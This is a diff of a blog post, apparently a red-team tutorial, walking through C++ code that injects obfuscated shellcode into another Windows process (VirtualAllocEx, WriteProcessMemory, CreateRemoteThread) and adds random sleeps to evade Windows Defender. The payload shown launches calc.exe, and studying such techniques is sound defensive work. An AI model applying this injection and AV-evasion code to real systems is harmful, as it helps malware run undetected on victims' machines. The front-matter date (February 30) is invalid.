@@ -16,26 +16,27 @@ last_modified_at: 2025-02-30 22:38:22 -0700
 ---
 
 # Quicklinks
-- [[#Intro]]
-- [[#Goals]]
-- [[#Generating the Shellcode]]
-	- [[#Obfuscating the Shellcode]]
-- [[#Creating the Code to Inject the Obfuscated Shellcode]]
-	- [[#Prerequisites]]
-	- [[#Function to Fetch a Handle from a PID]]
-	- [[#Function Generate Shellcode from Jigsaw Output]]
-	- [[#Creating Our main Function]]
-	- [[#Allocating Read Write Execute Memory in the Target Process]]
-	- [[#Writing the Shellcode to the Allocated Block of Memory]]
-	- [[#Creating a Thread to Run the Shellcode]]
-	- [[#Waiting and Terminating the Thread]]
-- [[#VirusTotal Scans]]
-	- [[#Base Shellcode]]
-	- [[#With Shellcode Obfuscation]]
-	- [[#With Sleep Statements]]
-	- [[#Using the Strip Utility]]
+- [Intro](#intro)
+- [Goals](#goals)
+- [Generating the Shellcode](#generating-the-shellcode)
+  - [Obfuscating the Shellcode](#obfuscating-the-shellcode)
+- [Creating the Code to Inject the Obfuscated Shellcode](#creating-the-code-to-inject-the-obfuscated-shellcode)
+  - [Prerequisites](#prerequisites)
+  - [Function to Fetch a Handle from a PID](#function-to-fetch-a-handle-from-a-pid)
+  - [Function Generate Shellcode from Jigsaw Output](#function-generate-shellcode-from-jigsaw-output)
+  - [Creating Our main Function](#creating-our-main-function)
+  - [Allocating Read Write Execute Memory in the Target Process](#allocating-read-write-execute-memory-in-the-target-process)
+  - [Writing the Shellcode to the Allocated Block of Memory](#writing-the-shellcode-to-the-allocated-block-of-memory)
+  - [Creating a Thread to Run the Shellcode](#creating-a-thread-to-run-the-shellcode)
+  - [Waiting and Terminating the Thread](#waiting-and-terminating-the-thread)
+- [VirusTotal Scans](#virustotal-scans)
+  - [Base Shellcode](#base-shellcode)
+  - [With Shellcode Obfuscation](#with-shellcode-obfuscation)
+  - [With Sleep Statements](#with-sleep-statements)
+  - [Using the Strip Utility](#using-the-strip-utility)
+  
 # Intro
-I wanted to sharpen my C++ development skills and deepen my understanding of offensive tooling used in red-team operations. To do that, I began developing a project focused on injecting shellcode into a running process while evading Windows Defender, purely for research and authorized security testing. In this blog post, I’ll walk through the techniques I used and challenges I encountered along with the C++ code.
+I wanted to sharpen my c++ development skills and deepen my understanding of offensive tooling used in red-team operations. To do that, I began developing a project focused on injecting shellcode into a running process while evading Windows Defender, purely for research and authorized security testing. In this blog post, I’ll walk through the techniques I used and challenges I encountered along with the c++ code.
 # Goals
 The goal of this project is to develop a shellcode-injection technique capable of launching `calc.exe` within a target process, even with Windows Defender and real-time protection fully enabled. This work is conducted strictly for research and authorized red-team use, focusing on understanding and evaluating modern defensive detection capabilities.
 # Generating the Shellcode
@@ -55,7 +56,7 @@ $ ls jigsaw.txt
 jigsaw.txt
 ```
 Here is the code truncated from `jigsaw.txt`.
-```C++
+```c++
 unsigned char jigsaw[296] = {...};
 unsigned char* shellcode;
 int positions[296] = {...};
@@ -76,7 +77,7 @@ for (size_t idx = 0; idx < len; ++idx) {
 We can use [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to find the handle from the provided PID
 
 Arguments:
-```C++
+```c++
 HANDLE OpenProcess(
   [in] DWORD dwDesiredAccess,
   [in] BOOL  bInheritHandle,
@@ -88,7 +89,7 @@ for `dwDesiredAccess` we pass `PROCESS_ALL_ACCESS`to request full rights. (A com
 
  If `bbInheritHandle` value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle. For this project, we set it to `FALSE`.
 
-```C++
+```c++
 HANDLE getHandleFromPid(DWORD pid) {
     HANDLE hProcess = OpenProcess(
         PROCESS_ALL_ACCESS,   // permissions
@@ -117,7 +118,7 @@ HANDLE getHandleFromPid(DWORD pid) {
 ```
 ## Function to Generate Shellcode from Jigsaw Output
 Next, we take the output from `jigsaw.txt` and wrap it in a function called `genShellcode()`:
-```C++
+```c++
 void genShellcode(unsigned char* shellcode, size_t len) {
     int payload_len = 296;
     unsigned char jigsaw[296] = { 0x5c, 0x41, 0x48, 0xff, 0xc1, 0x60, 0x74, 0x24, 0x83, 0xd0, 0xff, 0xed, 0x3c, 0x01, 0x38, 0x31 };
@@ -133,7 +134,7 @@ void genShellcode(unsigned char* shellcode, size_t len) {
 ```
 ## Creating Our main Function
 Now we can begin putting the pieces together. The `main` function will first parse the PID supplied by the user, then generate and reconstruct the obfuscated shellcode, and finally attempt to obtain a handle to the target process. After generating the shellcode, we also print its size for verification before moving on to the injection logic.
-```C++
+```c++
 int main(int argc, char* argv[])
 {
 	auto pid = atoi(argv[1]);
@@ -155,7 +156,7 @@ int main(int argc, char* argv[])
 We can use [`VirtualAllocEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate memory in the target process.
 
 **Arguments:**
-```C++
+```c++
 LPVOID VirtualAllocEx(
   [in]           HANDLE hProcess,
   [in, optional] LPVOID lpAddress,
@@ -173,7 +174,7 @@ LPVOID VirtualAllocEx(
 | **MEM_RESERVE**<br><br>0x00002000 | Reserves a range of the process's virtual address space without allocating any actual physical storage in memory or in the paging file on disk.<br><br>You commit reserved pages by calling **VirtualAllocEx** again with **MEM_COMMIT**. To reserve and commit pages in one step, call **VirtualAllocEx** with `MEM_COMMIT \| MEM_RESERVE`.<br><br>Other memory allocation functions, such as **malloc** and [LocalAlloc](https://learn.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-localalloc), cannot use reserved memory until it has been released. |
 and finally `flProtect` is the memory protection for the region. When allocating dynamic memory for an enclave, the `flProtec`t parameter must be `PAGE_READWRITE` or `PAGE_EXECUTE_READWRITE`.
 
-```C++
+```c++
 // allocate RWX memory in target
 LPVOID hMemory = VirtualAllocEx(
 	hProcess,                           // target process
@@ -196,7 +197,7 @@ std::cout << "[+] Allocated RWX memory in target handle" << std::endl;
 We can use [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the shellcode to the allocated block of memory. 
 
 Arguments:
-```C++
+```c++
 BOOL WriteProcessMemory(
   [in]  HANDLE  hProcess,
   [in]  LPVOID  lpBaseAddress,
@@ -208,7 +209,7 @@ BOOL WriteProcessMemory(
 
 `lpBaseAddress` is a pointer to the block of memory allocated by `VirtualAllocEx`. `lpBuffer` is the shellcode we want to inject. `nSize` is the size of the shellcode and `lpNumberOfBytesWritten` is a pointer to a variable that receives the number of bytes transferred into the specific process. 
 
-```C++
+```c++
 // write shellcode to target process memory
 SIZE_T bytesWritten = 0;
 BOOL writeOk = WriteProcessMemory(
@@ -235,7 +236,7 @@ std::cout << "[+] Wrote shellcode to process memory (size: " << shellcodeSize <<
 We can use [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
 
 Arguments:
-```C++
+```c++
 HANDLE CreateRemoteThread(
   [in]  HANDLE                 hProcess,
   [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
@@ -255,7 +256,7 @@ For this project, we only need to focus on the arguments relevant to launching o
 
 All other parameters can remain `nullptr` or `0` for default behavior.
 
-```C++
+```c++
 // create remote thread in target process
 DWORD threadId = 0;
 HANDLE hThread = CreateRemoteThread(
@@ -282,7 +283,7 @@ std::cout << "[+] Waiting for thread: " << hThread << " to complete" << std::end
 
 ## Waiting and Terminating the Thread
 Finally we can use [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) to close the created Thread. 
-```C++
+```c++
     // cleanup
     CloseHandle(hThread);
     std::cout << "[+] Exited!" << std::endl;
@@ -297,7 +298,7 @@ Awww man Windows Defender caught it! Lets implement some obfuscation techniques.
 Executing `VirtualAllocEx → WriteProcessMemory → CreateRemoteThread` back-to-back within milliseconds is highly suspicious behavior and easily flagged by Defender and other EDR products.
 
 To simulate more realistic execution timing and introduce entropy, I added randomized sleep delays between major steps.
-```C++
+```c++
 void sleepForRandom() {
     std::random_device rd;
     std::mt19937 gen(rd());
